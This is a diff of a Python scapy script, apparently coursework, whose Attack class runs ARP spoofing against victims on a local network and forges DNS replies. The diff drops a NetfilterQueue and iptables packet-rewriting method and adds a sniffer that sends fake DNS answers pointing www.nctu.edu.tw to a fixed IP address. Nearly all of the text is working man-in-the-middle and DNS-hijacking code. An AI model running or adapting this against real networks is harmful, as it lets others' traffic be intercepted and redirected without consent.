@@ -6,12 +6,6 @@ import scapy.all as scapy
 from scapy.layers.http import HTTPRequest
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 import time
-from netfilterqueue import NetfilterQueue
-import threading
-
-dns_hosts = {
-    b"www.nctu.edu.tw.": "140.113.207.246"
-}
 
 class Attack():
     def __init__(self):
@@ -74,50 +68,30 @@ class Attack():
             self.restore(self.ap, v)
         exit(0)
     
-    def modify_packet(self,packet):
-        qname = packet[DNSQR].qname
-        if qname not in dns_hosts:
-            return packet
-        packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
-        packet[DNS].ancount = 1
-        del packet[IP].len
-        del packet[IP].chksum
-        del packet[UDP].len
-        del packet[UDP].chksum
-        return packet    
-
-    def process_packets(self,packet):
-        pkt = IP( packet.get_payload())
-        if pkt.haslayer(DNSRR):
-           print("[Before]:", pkt.summary())
-           try:
-               pkt = self.modify_packet(pkt)
-           except IndexError:
-               pass
-           print("[After]:",pkt.summary())
-           packet.set_payload(bytes(pkt))
-        packet.accept() 
-
     def sniff_packets(self):
-        nfqueue = NetfilterQueue()
-        nfqueue.bind(QUEUE_NUM, self.process_packets)
-        nfqueue.run()
-        
+        for v in self.victim:
+            t = scapy.AsyncSniffer(filter='udp dst port 53', prn=self.process_packet, iface=self.interfaces[1], store=0)
+            t.start()
 
+    def process_packet(self, packet):
+        pkt = packet
+        if UDP in pkt and DNS in pkt:
+            qname = packet[DNSQR].qname
+            if b'www.nctu.edu.tw' in qname:
+                cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
+                fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246') / DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246'))
+                scapy.send(fakeResponse, verbose=0)
 
-QUEUE_NUM = 0
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 attack = Attack()
 attack._enable_linux_iproute()
 attack.get_ip()
 attack.get_mac(attack.network[1])
 for v in attack.victim:
     print('victim: ', v, 'mac: ', attack.ip_mac[v])
+
 try:
-    t = threading.Thread(target = attack.sniff_packets)
-    t.start()
+    attack.sniff_packets()
     while 1:
         attack.arp_spoofing()
-except KeyboardInterrupt:
-    os.system("iptables --flush")
+except:
     attack.ret_arp_spoofing()
